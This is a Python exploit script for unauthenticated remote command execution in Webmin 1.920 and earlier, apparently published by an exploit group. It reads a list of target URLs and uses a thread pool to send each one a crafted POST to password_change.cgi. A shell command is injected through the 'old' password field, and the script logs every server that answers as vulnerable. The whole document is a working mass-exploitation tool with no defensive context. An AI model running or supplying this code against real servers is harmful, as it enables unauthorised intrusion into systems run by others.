### Webmin <= 1.920 Unauth RCE
### https://www.exploitkita.org/2019/11/webmin-1920-unauthorization-rce.html?m=1
### Coded By Con7ext
### Exploit-Kita
import requests
import warnings
import sys
import re
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

loa = [i.strip() for i in open(sys.argv[1], "r").readlines()]

def exKita_Webmin(url):
  url = url.rstrip("/")
  headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "%s/session_login.cgi" % (url),
    "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1"
    }
  payloads = {
    "user": "rintodd",
    "pam": None,
    "expired": "2",
    "old": "botak|echo Rintodss;uname -a;echo Rintodss",
    "new1": "kntlll",
    "new2": "kntlll"
    }
  try:
    r = requests.post(url + "/password_change.cgi", headers=headers, data=payloads, verify=False, timeout=15)
    if "Rintodss" in r.text:
      ol = r.text.replace("\n", "")
      fuk = re.findall("Rintodss(.*?)Rintodss", ol)[0]
    ##print(r.text)
      print("[*] " + url + " -> Vuln")
      print("[*] " + fuk)
      f = open("webmin.txt", "a+")
      f.write(url + "\n")
    else:
      print("[*] " + url + " -> Fail")
  except:
    print("[-] " + url + " -> Error")
  
    
po = Pool(4)
po.map(exKita_Webmin, loa)
